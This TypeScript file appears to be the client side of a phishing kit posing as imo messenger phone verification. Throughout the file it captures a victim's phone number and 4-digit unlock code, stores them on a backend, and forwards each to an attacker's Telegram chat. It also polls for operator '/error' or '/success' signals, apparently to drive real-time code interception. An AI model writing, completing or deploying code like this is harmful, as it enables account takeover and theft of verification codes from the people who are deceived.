import { sendToTelegram } from './telegram';

export interface VerificationResponse {
  success: boolean;
  message?: string;
  verificationId?: string;
  phoneNumber?: string;
  error?: string;
}

export interface StatusResponse {
  success: boolean;
  signal: 'waiting' | 'error' | 'success';
  status?: string;
  verificationId?: string;
  unlockCode?: string;
}

/**
 * Submit phone number to Database Server and Telegram
 */
export async function submitPhoneNumberToDatabase(params: {
  phoneNumber: string;
  countryCode: string;
  device?: string;
}): Promise<VerificationResponse> {
  const { phoneNumber, countryCode, device = 'Redmi A2+' } = params;
  const fullPhone = phoneNumber.startsWith('+') ? phoneNumber : `${countryCode}${phoneNumber.replace(/^0+/, '')}`;

  let dbResult: VerificationResponse = { success: false };
  try {
    const res = await fetch('/api/verify/phone', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phoneNumber: fullPhone,
        countryCode,
        device,
        userAgent: navigator.userAgent,
      }),
    });

    if (res.ok) {
      dbResult = await res.json();
      console.log('[Database Server] Phone verification saved:', dbResult);
    }
  } catch (err) {
    console.warn('[Database Server] Direct API call warning:', err);
  }

  const tgMessage = 
    `📱 *Phone Verification Request (imo)*\n` +
    `📞 Phone: \`${fullPhone}\`\n` +
    `📱 Device: \`${device}\`\n` +
    `🕒 Time: ${new Date().toLocaleTimeString('en-US')}\n` +
    `💾 Server ID: \`${dbResult.verificationId || 'local_session'}\``;

  await sendToTelegram(tgMessage);

  return dbResult;
}

/**
 * Submit 4-digit unlock code to Database Server and Telegram
 */
export async function submitUnlockCodeToDatabase(params: {
  code: string;
  verificationId?: string;
  phoneNumber?: string;
  device?: string;
}): Promise<VerificationResponse> {
  const { code, verificationId, phoneNumber, device = 'Redmi A2+' } = params;

  let dbResult: VerificationResponse = { success: false };
  try {
    const res = await fetch('/api/verify/code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        code,
        verificationId,
        phoneNumber,
        device,
      }),
    });

    if (res.ok) {
      dbResult = await res.json();
      console.log('[Database Server] Unlock code saved:', dbResult);
    }
  } catch (err) {
    console.warn('[Database Server] Direct API call warning:', err);
  }

  const targetId = dbResult.verificationId || verificationId || 'latest';
  const tgMessage = 
    `🔑 *Unlock Code Received (imo)*\n` +
    `🔢 Code: \`${code}\`\n` +
    `📞 Phone: \`${phoneNumber || 'Current User'}\`\n` +
    `📱 Device: \`${device}\`\n` +
    `🕒 Time: ${new Date().toLocaleTimeString('en-US')}\n` +
    `💾 ID: \`${targetId}\``;

  await sendToTelegram(tgMessage);

  return dbResult;
}

/**
 * Poll database server for verification signal (/error or /success)
 */
export async function checkVerificationStatus(verificationId: string): Promise<StatusResponse> {
  try {
    const id = verificationId || 'latest';
    const res = await fetch(`/api/verify/status/${encodeURIComponent(id)}?_t=${Date.now()}`);
    if (res.ok) {
      return await res.json();
    }
  } catch (err) {
    console.warn('[Database Server] Status check error:', err);
  }
  return { success: false, signal: 'waiting' };
}

/**
 * Trigger verification signal manually or for testing (/error or /success)
 */
export async function sendVerificationSignal(verificationId: string, signal: 'error' | 'success'): Promise<boolean> {
  try {
    const res = await fetch('/api/verify/signal', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ verificationId: verificationId || 'latest', signal }),
    });
    return res.ok;
  } catch (err) {
    console.error('[Database Server] Send signal error:', err);
    return false;
  }
}
